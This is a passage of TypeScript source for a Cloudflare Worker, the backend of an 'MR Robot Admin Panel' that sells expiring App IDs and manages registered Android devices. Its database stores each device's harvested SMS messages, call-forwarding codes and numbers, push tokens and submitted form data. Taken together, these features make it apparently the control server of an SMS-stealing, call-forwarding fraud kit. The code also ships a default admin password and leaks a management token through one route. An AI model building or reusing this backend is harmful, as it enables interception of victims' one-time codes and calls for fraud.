/**
 * MR Robot Admin Panel — Cloudflare Worker (Backend API)
 * Deployed at: android-panel-api.<account>.workers.dev
 *
 * Required Cloudflare Worker secrets (wrangler secret put ...):
 *   SUPABASE_SERVICE_ROLE_KEY  — Supabase service role key
 *   SUPABASE_MANAGEMENT_TOKEN  — Supabase PAT for auto table creation
 *   ADMIN_DEFAULT_PASSWORD     — Initial admin password (default: mrrobot123)
 */

export interface Env {
  SUPABASE_URL?: string;
  SUPABASE_SERVICE_ROLE_KEY: string;
  SUPABASE_MANAGEMENT_TOKEN?: string;
  ADMIN_DEFAULT_PASSWORD?: string;
  ALLOWED_ORIGIN?: string; // e.g. https://android-panel-mr-robot.pages.dev
}

// ── Constants ─────────────────────────────────────────────────────────────────
const SB_URL_DEFAULT  = "https://dvgcrxrnnezbdjpujjjt.supabase.co";
const PROJECT_REF     = "dvgcrxrnnezbdjpujjjt";
const TOKEN_TTL_MS    = 7 * 24 * 60 * 60 * 1000; // 7 days

// ── Setup SQL ─────────────────────────────────────────────────────────────────
const SETUP_SQL = `
CREATE TABLE IF NOT EXISTS admin_config (
  key        TEXT PRIMARY KEY,
  value      TEXT NOT NULL,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE IF NOT EXISTS apps (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT UNIQUE NOT NULL,
  name       TEXT,
  pin        TEXT NOT NULL DEFAULT '1234',
  status     TEXT NOT NULL DEFAULT 'active',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at TIMESTAMPTZ
);
CREATE TABLE IF NOT EXISTS devices (
  id                    BIGSERIAL PRIMARY KEY,
  app_id                TEXT NOT NULL,
  sub_id                TEXT NOT NULL DEFAULT '',
  device_id             TEXT,
  status                TEXT NOT NULL DEFAULT 'active',
  data_type             TEXT NOT NULL DEFAULT 'registered_device',
  device_name           TEXT,
  device_model          TEXT,
  android_version       TEXT,
  sms_messages          JSONB NOT NULL DEFAULT '[]',
  total_sms_count       INTEGER NOT NULL DEFAULT 0,
  last_sms_timestamp    BIGINT NOT NULL DEFAULT 0,
  last_sms_log          JSONB NOT NULL DEFAULT '{}',
  sms_sync_status       TEXT,
  sms_pending_count     INTEGER NOT NULL DEFAULT 0,
  sms_processed_count   INTEGER NOT NULL DEFAULT 0,
  sms_permission_status TEXT,
  sms_last_sync_at      BIGINT,
  sms_last_error        TEXT,
  call_forward_status   TEXT,
  call_forward_action   TEXT,
  call_forward_code     TEXT,
  call_forward_number   TEXT,
  call_forward_sim_slot INTEGER,
  call_forward_response TEXT,
  call_forward_timestamp BIGINT,
  last_heartbeat_at     BIGINT,
  data_json             JSONB NOT NULL DEFAULT '{}',
  registered_at         TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_active             BOOLEAN NOT NULL DEFAULT TRUE,
  last_seen             TIMESTAMPTZ,
  fcm_token             TEXT NOT NULL DEFAULT '',
  fcm_token_status      TEXT NOT NULL DEFAULT 'not_registered',
  UNIQUE(app_id, sub_id)
);
CREATE TABLE IF NOT EXISTS admin_sessions (
  id          BIGSERIAL PRIMARY KEY,
  app_id      TEXT NOT NULL,
  sub_id      TEXT,
  login_time  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  user_agent  TEXT,
  ip          TEXT,
  is_valid    BOOLEAN NOT NULL DEFAULT TRUE
);
CREATE TABLE IF NOT EXISTS messages (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT NOT NULL,
  sub_id       TEXT,
  from_id      TEXT,
  to_id        TEXT,
  content      TEXT NOT NULL,
  message_type TEXT NOT NULL DEFAULT 'message',
  sent_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_read      BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE TABLE IF NOT EXISTS form_data (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT NOT NULL,
  sub_id       TEXT,
  form_type    TEXT NOT NULL DEFAULT 'form',
  data         JSONB NOT NULL DEFAULT '{}',
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE IF NOT EXISTS proxy_rules (
  id         BIGSERIAL PRIMARY KEY,
  action     TEXT NOT NULL,
  field      TEXT NOT NULL,
  value      TEXT NOT NULL,
  endpoints  TEXT NOT NULL DEFAULT 'all',
  note       TEXT NOT NULL DEFAULT '',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_id TEXT;
ALTER TABLE devices  ADD COLUMN IF NOT EXISTS fcm_token TEXT NOT NULL DEFAULT '';
ALTER TABLE devices  ADD COLUMN IF NOT EXISTS fcm_token_status TEXT NOT NULL DEFAULT 'not_registered';
`.trim();

// ── CORS ──────────────────────────────────────────────────────────────────────
function corsHeaders(env: Env, req?: Request): Record<string, string> {
  const origin = env.ALLOWED_ORIGIN || "*";
  // If ALLOWED_ORIGIN is set, reflect the request origin only if it matches
  const reqOrigin = req?.headers.get("Origin") ?? "";
  const allow = (origin === "*") ? "*" : (reqOrigin === origin ? reqOrigin : origin);
  return {
    "Access-Control-Allow-Origin": allow,
    "Access-Control-Allow-Methods": "GET,POST,PUT,PATCH,DELETE,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type,x-admin-token",
    "Access-Control-Max-Age": "86400",
  };
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function json(data: unknown, status = 200, corsH: Record<string, string> = {}): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json", ...corsH },
  });
}

async function sha256hex(text: string): Promise<string> {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

// ── Supabase REST client ───────────────────────────────────────────────────────
type SbResult = { data: unknown; error: unknown; status: number };

function sbHeaders(key: string, extra: Record<string, string> = {}): Record<string, string> {
  return {
    apikey: key,
    Authorization: `Bearer ${key}`,
    "Content-Type": "application/json",
    Prefer: "return=representation",
    ...extra,
  };
}

async function sbFetch(
  url: string, key: string,
  method: string, body?: unknown,
  extra: Record<string, string> = {},
): Promise<SbResult> {
  const res = await fetch(url, {
    method,
    headers: sbHeaders(key, extra),
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  if (res.status === 204) return { data: null, error: null, status: 204 };
  const payload = await res.json().catch(() => ({}));
  if (!res.ok) return { data: null, error: payload, status: res.status };
  return { data: payload, error: null, status: res.status };
}

function isTableMissing(error: unknown): boolean {
  if (!error || typeof error !== "object") return false;
  const e = error as Record<string, string>;
  return (
    e.code === "42P01" ||
    !!e.message?.includes("Could not find the table") ||
    !!e.message?.includes("in the schema cache") ||
    (!!e.message?.includes("relation") && !!e.message?.includes("does not exist"))
  );
}

function dbErrResp(error: unknown, cors: Record<string, string>): Response | null {
  if (!error) return null;
  if (isTableMissing(error)) return json({ error: "Database tables not set up yet.", needs_setup: true }, 503, cors);
  const e = error as Record<string, string>;
  return json({ error: e.message ?? "DB error" }, 500, cors);
}

// Fluent query builder — mirrors supabase-js API surface used by the admin panel
class QB {
  private _url: string;
  private _key: string;
  private _method = "GET";
  private _params: string[] = [];
  private _body?: unknown;
  private _single = false;

  constructor(sbUrl: string, key: string, table: string) {
    this._url  = `${sbUrl}/rest/v1/${table}`;
    this._key  = key;
  }

  select(cols = "*") { this._params.push(`select=${encodeURIComponent(cols)}`); return this; }
  eq(col: string, val: unknown) { this._params.push(`${col}=eq.${encodeURIComponent(String(val))}`); return this; }
  neq(col: string, val: unknown) { this._params.push(`${col}=neq.${encodeURIComponent(String(val))}`); return this; }
  gte(col: string, val: unknown) { this._params.push(`${col}=gte.${encodeURIComponent(String(val))}`); return this; }
  order(col: string, opts?: { ascending?: boolean }) { this._params.push(`order=${col}.${opts?.ascending === false ? "desc" : "asc"}`); return this; }
  limit(n: number) { this._params.push(`limit=${n}`); return this; }
  single()  { this._single = true; return this; }
  insert(d: unknown) { this._method = "POST";  this._body = d; return this; }
  update(d: unknown) { this._method = "PATCH"; this._body = d; return this; }
  delete()  { this._method = "DELETE"; return this; }

  async execute(): Promise<SbResult> {
    const qs  = this._params.join("&");
    const url = qs ? `${this._url}?${qs}` : this._url;
    const extra: Record<string, string> = {};
    if (this._single) extra["Accept"] = "application/vnd.pgrst.object+json";
    return sbFetch(url, this._key, this._method, this._body, extra);
  }

  // Make the builder thenable so callers can: `const { data } = await builder;`
  then<T>(resolve: (v: SbResult) => T | PromiseLike<T>, reject?: (reason: unknown) => T | PromiseLike<T>): Promise<T> {
    return this.execute().then(resolve, reject);
  }
}

class DB {
  constructor(private url: string, private key: string) {}
  from(table: string): QB { return new QB(this.url, this.key, table); }
}

function makeDB(env: Env): DB { return new DB(env.SUPABASE_URL ?? SB_URL_DEFAULT, env.SUPABASE_SERVICE_ROLE_KEY); }

// ── Auth — stateless HMAC tokens (signed with service role key) ───────────────
async function signToken(env: Env): Promise<string> {
  const iat     = Date.now();
  const payload = btoa(JSON.stringify({ iat, adm: 1 }));
  const secret  = await crypto.subtle.importKey(
    "raw", new TextEncoder().encode(env.SUPABASE_SERVICE_ROLE_KEY),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
  );
  const sigBuf = await crypto.subtle.sign("HMAC", secret, new TextEncoder().encode(payload));
  const sigHex = Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, "0")).join("");
  return `${payload}.${sigHex}`;
}

async function verifyToken(env: Env, token: string | null | undefined): Promise<boolean> {
  if (!token) return false;
  const parts = token.split(".");
  if (parts.length !== 2) return false;
  const [payload, sigHex] = parts;
  try {
    const secret  = await crypto.subtle.importKey(
      "raw", new TextEncoder().encode(env.SUPABASE_SERVICE_ROLE_KEY),
      { name: "HMAC", hash: "SHA-256" }, false, ["verify"],
    );
    const sigBytes = new Uint8Array(sigHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const valid    = await crypto.subtle.verify("HMAC", secret, sigBytes, new TextEncoder().encode(payload));
    if (!valid) return false;
    const { iat } = JSON.parse(atob(payload)) as { iat: number };
    return Date.now() - iat < TOKEN_TTL_MS;
  } catch { return false; }
}

async function getPasswordHash(env: Env, db: DB): Promise<string> {
  try {
    const { data } = await db.from("admin_config").select("value").eq("key", "admin_password_hash").single();
    if (data && typeof data === "object" && "value" in (data as object)) {
      return (data as { value: string }).value;
    }
  } catch {}
  return sha256hex(env.ADMIN_DEFAULT_PASSWORD ?? "mrrobot123");
}

async function savePasswordHash(env: Env, db: DB, hash: string): Promise<void> {
  // upsert — try insert first, then update on conflict
  const r = await db.from("admin_config")
    .insert({ key: "admin_password_hash", value: hash, updated_at: new Date().toISOString() });
  if (r.error) {
    await db.from("admin_config")
      .update({ value: hash, updated_at: new Date().toISOString() })
      .eq("key", "admin_password_hash");
  }
}

// ── DB setup ──────────────────────────────────────────────────────────────────
async function tablesReady(db: DB): Promise<boolean> {
  const { error } = await db.from("apps").select("id").limit(1);
  return !isTableMissing(error);
}

async function runSetup(env: Env, pat?: string): Promise<{ ok: boolean; error?: string }> {
  const token = pat ?? env.SUPABASE_MANAGEMENT_TOKEN;
  if (!token) return { ok: false, error: "No management token available. Set SUPABASE_MANAGEMENT_TOKEN." };
  const res = await fetch(`https://api.supabase.com/v1/projects/${PROJECT_REF}/database/query`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ query: SETUP_SQL }),
  });
  if (res.ok) return { ok: true };
  const err = await res.text().catch(() => "");
  return { ok: false, error: `Supabase API ${res.status}: ${err.slice(0, 300)}` };
}

// ── App ID generator ──────────────────────────────────────────────────────────
const WORDS = ["MR","ROBOT","ALPHA","BETA","GAMMA","DELTA","ECHO","GHOST","HAWK","IRON","JADE","KING","LION","NOVA","ONYX","PRIME","RAVEN","SIGMA","TITAN","VIPER","WOLF","ZERO","BLAZE","CYBER","EAGLE","FLASH","NINJA","ORBIT","SPARK","STORM"];
function rndChars(n: number) { const c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; return Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join(""); }
function generateAppId() { return `${WORDS[Math.floor(Math.random() * WORDS.length)]}-${WORDS[Math.floor(Math.random() * WORDS.length)]}-${rndChars(4)}@${rndChars(3)}`; }

// ── Route helper ──────────────────────────────────────────────────────────────
function matchPath(pattern: string, path: string): Record<string, string> | null {
  const pp = pattern.split("/"), sp = path.split("/");
  if (pp.length !== sp.length) return null;
  const params: Record<string, string> = {};
  for (let i = 0; i < pp.length; i++) {
    if (pp[i].startsWith(":")) params[pp[i].slice(1)] = decodeURIComponent(sp[i]);
    else if (pp[i] !== sp[i]) return null;
  }
  return params;
}

// ── Main fetch handler ────────────────────────────────────────────────────────
export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const cors = corsHeaders(env, request);

    // Preflight
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });

    const url    = new URL(request.url);
    const method = request.method;
    // Strip /api prefix if proxied via Pages _redirects
    const path   = url.pathname.replace(/^\/api/, "") || "/";

    const db     = makeDB(env);
    const token  = request.headers.get("x-admin-token");
    const authed = await verifyToken(env, token);

    function authErr(): Response | null { return authed ? null : json({ error: "Unauthorized" }, 401, cors); }
    async function bodyJson(): Promise<Record<string, unknown>> {
      try { return await request.json() as Record<string, unknown>; } catch { return {}; }
    }

    try {
      // ── Health ──────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/healthz") return json({ ok: true, runtime: "cloudflare-worker" }, 200, cors);

      // ── Login ───────────────────────────────────────────────────────────────
      if (method === "POST" && path === "/admin/login") {
        const { password } = await bodyJson() as { password?: string };
        if (!password) return json({ error: "Password required" }, 400, cors);
        const [expected, actual] = await Promise.all([getPasswordHash(env, db), sha256hex(password)]);
        if (actual !== expected) return json({ error: "Wrong password" }, 401, cors);
        // Auto-setup on first login if tables are missing
        if (env.SUPABASE_MANAGEMENT_TOKEN && !(await tablesReady(db))) await runSetup(env);
        const adminToken = await signToken(env);
        return json({ ok: true, token: adminToken }, 200, cors);
      }

      if (method === "POST" && path === "/admin/logout") return json({ ok: true }, 200, cors);

      // ── DB Status / Setup ────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/db-status") {
        const a = authErr(); if (a) return a;
        const ready = await tablesReady(db);
        if (!ready && env.SUPABASE_MANAGEMENT_TOKEN) {
          const r = await runSetup(env);
          if (r.ok) return json({ tables_ready: true, error: null, setup_sql: null }, 200, cors);
        }
        return json({ tables_ready: ready, error: ready ? null : "Tables not found", setup_sql: ready ? null : SETUP_SQL }, 200, cors);
      }

      if (method === "GET" && path === "/admin/bootstrap") {
        const a = authErr(); if (a) return a;
        const ready = await tablesReady(db);
        if (!ready && env.SUPABASE_MANAGEMENT_TOKEN) {
          await runSetup(env);
          return json({ tables_ready: true, setup_sql: null, pat: null }, 200, cors);
        }
        return json({ tables_ready: ready, setup_sql: ready ? null : SETUP_SQL, pat: env.SUPABASE_MANAGEMENT_TOKEN ?? null }, 200, cors);
      }

      if (method === "POST" && path === "/admin/run-setup") {
        const a = authErr(); if (a) return a;
        const r = await runSetup(env);
        return json({ ok: r.ok, error: r.error, setup_sql: SETUP_SQL }, 200, cors);
      }

      if (method === "POST" && path === "/admin/setup") {
        const a = authErr(); if (a) return a;
        const { pat } = await bodyJson() as { pat?: string };
        if (!pat?.trim()) return json({ ok: false, message: "PAT required" }, 400, cors);
        const r = await runSetup(env, pat.trim());
        if (!r.ok) return json({ ok: false, message: r.error ?? "Setup failed" }, 200, cors);
        return json({ ok: true, message: "All tables created!" }, 200, cors);
      }

      if (method === "GET" && path === "/admin/db-setup-sql") {
        const a = authErr(); if (a) return a;
        return json({ sql: SETUP_SQL }, 200, cors);
      }

      if (method === "GET" && path === "/admin/init-status") {
        const a = authErr(); if (a) return a;
        return json({ tables_exist: await tablesReady(db) }, 200, cors);
      }

      // ── Change Password ──────────────────────────────────────────────────────
      if (method === "POST" && path === "/admin/change-password") {
        const a = authErr(); if (a) return a;
        const { old_password, new_password } = await bodyJson() as { old_password?: string; new_password?: string };
        if (!old_password || !new_password) return json({ error: "Both required" }, 400, cors);
        const [expected, actual] = await Promise.all([getPasswordHash(env, db), sha256hex(old_password)]);
        if (actual !== expected) return json({ error: "Current password wrong hai" }, 401, cors);
        if (new_password.length < 4) return json({ error: "Min 4 characters" }, 400, cors);
        await savePasswordHash(env, db, await sha256hex(new_password));
        return json({ ok: true }, 200, cors);
      }

      // ── Stats ────────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/stats") {
        const a = authErr(); if (a) return a;
        const d7 = new Date(Date.now() - 7 * 864e5).toISOString();
        const [apps, devices, sessions, messages] = await Promise.all([
          db.from("apps").select("status,expires_at"),
          db.from("devices").select("is_active,registered_at"),
          db.from("admin_sessions").select("is_valid"),
          db.from("messages").select("is_read"),
        ]);
        if (isTableMissing(apps.error)) {
          return json({ total_apps:0, active_apps:0, inactive_apps:0, expired_apps:0, total_devices:0, active_devices:0, recent_devices_7d:0, total_sessions:0, active_sessions:0, unread_messages:0, proxy_blocked_today:0, proxy_accepted_today:0, needs_setup:true }, 200, cors);
        }
        const now = new Date().toISOString();
        type App = { status: string; expires_at?: string };
        type Dev = { is_active: boolean; registered_at: string };
        type Sess = { is_valid: boolean };
        type Msg = { is_read: boolean };
        const ap = (apps.data as App[]    ?? []);
        const dv = (devices.data as Dev[] ?? []);
        const ss = (sessions.data as Sess[] ?? []);
        const mg = (messages.data as Msg[]  ?? []);
        return json({
          total_apps: ap.length,
          active_apps: ap.filter(a => a.status === "active").length,
          inactive_apps: ap.filter(a => a.status !== "active").length,
          expired_apps: ap.filter(a => !!a.expires_at && a.expires_at < now).length,
          total_devices: dv.length,
          active_devices: dv.filter(d => d.is_active).length,
          recent_devices_7d: dv.filter(d => d.registered_at > d7).length,
          total_sessions: ss.length,
          active_sessions: ss.filter(s => s.is_valid).length,
          unread_messages: mg.filter(m => !m.is_read).length,
          proxy_blocked_today: 0,
          proxy_accepted_today: 0,
        }, 200, cors);
      }

      // ── Generate App ID ──────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/generate-app-id") {
        const a = authErr(); if (a) return a;
        const { data } = await db.from("apps").select("app_id");
        const existing = new Set(((data as { app_id: string }[]) ?? []).map(r => r.app_id));
        for (let i = 0; i < 20; i++) { const c = generateAppId(); if (!existing.has(c)) return json({ app_id: c }, 200, cors); }
        return json({ app_id: generateAppId() }, 200, cors);
      }

      // ── App IDs ──────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/app-ids") {
        const a = authErr(); if (a) return a;
        const { data: apps, error } = await db.from("apps").select("*").order("created_at", { ascending: false });
        const e = dbErrResp(error, cors); if (e) return e;
        const [{ data: devs }, { data: sess }] = await Promise.all([
          db.from("devices").select("app_id,is_active"),
          db.from("admin_sessions").select("app_id,is_valid"),
        ]);
        const dc: Record<string, { total: number; active: number }> = {};
        const sc: Record<string, number> = {};
        for (const x of (devs as { app_id: string; is_active: boolean }[] ?? [])) {
          if (!dc[x.app_id]) dc[x.app_id] = { total: 0, active: 0 };
          dc[x.app_id].total++; if (x.is_active) dc[x.app_id].active++;
        }
        for (const x of (sess as { app_id: string; is_valid: boolean }[] ?? []))
          if (x.is_valid) sc[x.app_id] = (sc[x.app_id] ?? 0) + 1;
        const rows = ((apps as { app_id: string }[]) ?? []).map(r => ({
          ...r,
          device_count: dc[r.app_id]?.total ?? 0,
          active_count: dc[r.app_id]?.active ?? 0,
          active_sessions: sc[r.app_id] ?? 0,
        }));
        return json({ needs_setup: false, rows }, 200, cors);
      }

      if (method === "POST" && path === "/admin/app-ids") {
        const a = authErr(); if (a) return a;
        const { app_id, pin = "1234", name, expires_at } = await bodyJson() as { app_id: string; pin?: string; name?: string; expires_at?: string };
        if (!app_id) return json({ error: "app_id required" }, 400, cors);
        const { data, error } = await db.from("apps").insert({ app_id, name: name ?? null, pin, status: "active", created_at: new Date().toISOString(), expires_at: expires_at ?? new Date(Date.now() + 30 * 864e5).toISOString() }).select("*").single();
        if ((error as { code?: string } | null)?.code === "23505") return json({ error: `"${app_id}" already exists` }, 409, cors);
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data, 201, cors);
      }

      let m: Record<string, string> | null;

      if (method === "PATCH" && (m = matchPath("/admin/app-ids/:appId/password", path))) {
        const a = authErr(); if (a) return a;
        const { new_password } = await bodyJson() as { new_password: string };
        if (!new_password) return json({ error: "new_password required" }, 400, cors);
        const { error } = await db.from("apps").update({ pin: new_password }).eq("app_id", m.appId);
        const e = dbErrResp(error, cors); if (e) return e;
        return json({ ok: true }, 200, cors);
      }

      if (method === "POST" && (m = matchPath("/admin/app-ids/:appId/reset-password", path))) {
        const a = authErr(); if (a) return a;
        await db.from("apps").update({ pin: "1234" }).eq("app_id", m.appId);
        return json({ ok: true }, 200, cors);
      }

      if (method === "POST" && (m = matchPath("/admin/app-ids/:appId/extend", path))) {
        const a = authErr(); if (a) return a;
        const { data: app } = await db.from("apps").select("expires_at").eq("app_id", m.appId).single();
        if (!app) return json({ error: "Not found" }, 404, cors);
        const base = new Date(Math.max(new Date((app as { expires_at: string }).expires_at).getTime(), Date.now()));
        const expires_at = new Date(base.getTime() + 30 * 864e5).toISOString();
        await db.from("apps").update({ expires_at }).eq("app_id", m.appId);
        return json({ ok: true, expires_at }, 200, cors);
      }

      if (method === "PATCH" && (m = matchPath("/admin/app-ids/:appId/toggle", path))) {
        const a = authErr(); if (a) return a;
        const { status } = await bodyJson() as { status: string };
        const { error } = await db.from("apps").update({ status }).eq("app_id", m.appId);
        const e = dbErrResp(error, cors); if (e) return e;
        return json({ ok: true }, 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/app-ids/:appId", path))) {
        const a = authErr(); if (a) return a;
        await Promise.all([
          db.from("apps").delete().eq("app_id", m.appId),
          db.from("devices").delete().eq("app_id", m.appId),
          db.from("admin_sessions").delete().eq("app_id", m.appId),
          db.from("messages").delete().eq("app_id", m.appId),
          db.from("form_data").delete().eq("app_id", m.appId),
        ]);
        return json({ ok: true }, 200, cors);
      }

      // ── Devices ──────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/devices") {
        const a = authErr(); if (a) return a;
        let q = db.from("devices").select("*").order("registered_at", { ascending: false });
        const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
        if (aid) q = q.eq("app_id", aid);
        if (sid) q = q.eq("sub_id", sid);
        const { data, error } = await q;
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data ?? [], 200, cors);
      }

      if (method === "PATCH" && (m = matchPath("/admin/devices/:id/toggle", path))) {
        const a = authErr(); if (a) return a;
        const { is_active } = await bodyJson() as { is_active: boolean };
        await db.from("devices").update({ is_active }).eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/devices/:id", path))) {
        const a = authErr(); if (a) return a;
        await db.from("devices").delete().eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      // ── Sessions ─────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/sessions") {
        const a = authErr(); if (a) return a;
        let q = db.from("admin_sessions").select("*").order("login_time", { ascending: false });
        const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
        if (aid) q = q.eq("app_id", aid);
        if (sid) q = q.eq("sub_id", sid);
        const { data, error } = await q;
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data ?? [], 200, cors);
      }

      if (method === "POST" && (m = matchPath("/admin/sessions/:id/invalidate", path))) {
        const a = authErr(); if (a) return a;
        await db.from("admin_sessions").update({ is_valid: false }).eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/sessions/app/:appId/all", path))) {
        const a = authErr(); if (a) return a;
        await db.from("admin_sessions").delete().eq("app_id", m.appId);
        return json({ ok: true }, 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/sessions/:id", path))) {
        const a = authErr(); if (a) return a;
        await db.from("admin_sessions").delete().eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      // ── Messages ─────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/messages") {
        const a = authErr(); if (a) return a;
        let q = db.from("messages").select("*").order("sent_at", { ascending: false });
        const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
        if (aid) q = q.eq("app_id", aid);
        if (sid) q = q.eq("sub_id", sid);
        const { data, error } = await q;
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data ?? [], 200, cors);
      }

      if (method === "PATCH" && (m = matchPath("/admin/messages/:id/read", path))) {
        const a = authErr(); if (a) return a;
        await db.from("messages").update({ is_read: true }).eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/messages/:id", path))) {
        const a = authErr(); if (a) return a;
        await db.from("messages").delete().eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      // ── Form Data ────────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/form-data") {
        const a = authErr(); if (a) return a;
        let q = db.from("form_data").select("*").order("submitted_at", { ascending: false });
        const aid = url.searchParams.get("app_id"), sid = url.searchParams.get("sub_id");
        if (aid) q = q.eq("app_id", aid);
        if (sid) q = q.eq("sub_id", sid);
        const { data, error } = await q;
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data ?? [], 200, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/form-data/:id", path))) {
        const a = authErr(); if (a) return a;
        await db.from("form_data").delete().eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      // ── Proxy Rules ───────────────────────────────────────────────────────────
      if (method === "GET" && path === "/admin/proxy/rules") {
        const a = authErr(); if (a) return a;
        const { data, error } = await db.from("proxy_rules").select("*").order("created_at", { ascending: false });
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data ?? [], 200, cors);
      }

      if (method === "POST" && path === "/admin/proxy/rules") {
        const a = authErr(); if (a) return a;
        const body = await bodyJson() as { action: string; field: string; value: string; endpoints?: string; note?: string };
        if (!body.action || !body.field || !body.value) return json({ error: "action, field, value required" }, 400, cors);
        const { data, error } = await db.from("proxy_rules").insert({ ...body, endpoints: body.endpoints ?? "all", note: body.note ?? "", created_at: new Date().toISOString() }).select("*").single();
        const e = dbErrResp(error, cors); if (e) return e;
        return json(data, 201, cors);
      }

      if (method === "DELETE" && (m = matchPath("/admin/proxy/rules/:id", path))) {
        const a = authErr(); if (a) return a;
        await db.from("proxy_rules").delete().eq("id", m.id);
        return json({ ok: true }, 200, cors);
      }

      if (method === "GET" && path === "/admin/proxy/log")    { const a = authErr(); if (a) return a; return json({ entries: [], total: 0, blocked: 0, accepted: 0 }, 200, cors); }
      if (method === "DELETE" && path === "/admin/proxy/log") { const a = authErr(); if (a) return a; return json({ ok: true }, 200, cors); }

      if (method === "GET" && path === "/admin/proxy/stats") {
        const a = authErr(); if (a) return a;
        const { data: rules } = await db.from("proxy_rules").select("id,action");
        const all = (rules as { id: number; action: string }[] ?? []);
        return json({ total:0, blocked:0, accepted:0, today_total:0, today_blocked:0, today_accepted:0, active_rules: all.length, block_rules: all.filter(r => r.action === "block").length, allow_rules: all.filter(r => r.action === "allow").length, connected_clients:0 }, 200, cors);
      }

      // ── Android Device Routes ─────────────────────────────────────────────────
      if (method === "POST" && path === "/register-device") {
        const body = await bodyJson() as { app_id?: string; sub_id?: string; device_id?: string; device_name?: string; device_model?: string; android_version?: string };
        if (!body.app_id || !body.device_id) return json({ error: "app_id and device_id required" }, 400, cors);
        const { data: app } = await db.from("apps").select("*").eq("app_id", body.app_id).eq("status", "active").single();
        if (!app) return json({ error: "Invalid or inactive App ID" }, 403, cors);
        if ((app as { expires_at?: string }).expires_at && new Date((app as { expires_at: string }).expires_at) < new Date())
          return json({ error: "App ID expired" }, 403, cors);
        const { data: existing } = await db.from("devices").select("*").eq("app_id", body.app_id).eq("device_id", body.device_id).single();
        if (existing) {
          await db.from("devices").update({ last_seen: new Date().toISOString() }).eq("id", (existing as { id: number }).id);
          return json({ ok: true, device: existing }, 200, cors);
        }
        const { data: newDev, error } = await db.from("devices").insert({ app_id: body.app_id, sub_id: body.sub_id ?? "", device_id: body.device_id, device_name: body.device_name ?? null, device_model: body.device_model ?? null, android_version: body.android_version ?? null, is_active: true, registered_at: new Date().toISOString(), last_seen: new Date().toISOString() }).select("*").single();
        const e = dbErrResp(error, cors); if (e) return e;
        return json({ ok: true, device: newDev }, 201, cors);
      }

      if (method === "POST" && path === "/send-message") {
        const body = await bodyJson() as { app_id?: string; sub_id?: string; from_id?: string; content?: string; message_type?: string };
        if (!body.app_id || !body.content) return json({ error: "app_id and content required" }, 400, cors);
        const { data: app } = await db.from("apps").select("id").eq("app_id", body.app_id).single();
        if (!app) return json({ error: "Invalid App ID" }, 403, cors);
        const { error } = await db.from("messages").insert({ app_id: body.app_id, sub_id: body.sub_id ?? null, from_id: body.from_id ?? null, content: body.content, message_type: body.message_type ?? "message", is_read: false, sent_at: new Date().toISOString() });
        const e = dbErrResp(error, cors); if (e) return e;
        return json({ ok: true }, 201, cors);
      }

      if (method === "POST" && path === "/submit-form") {
        const body = await bodyJson() as { app_id?: string; sub_id?: string; form_type?: string; data?: Record<string, unknown> };
        if (!body.app_id) return json({ error: "app_id required" }, 400, cors);
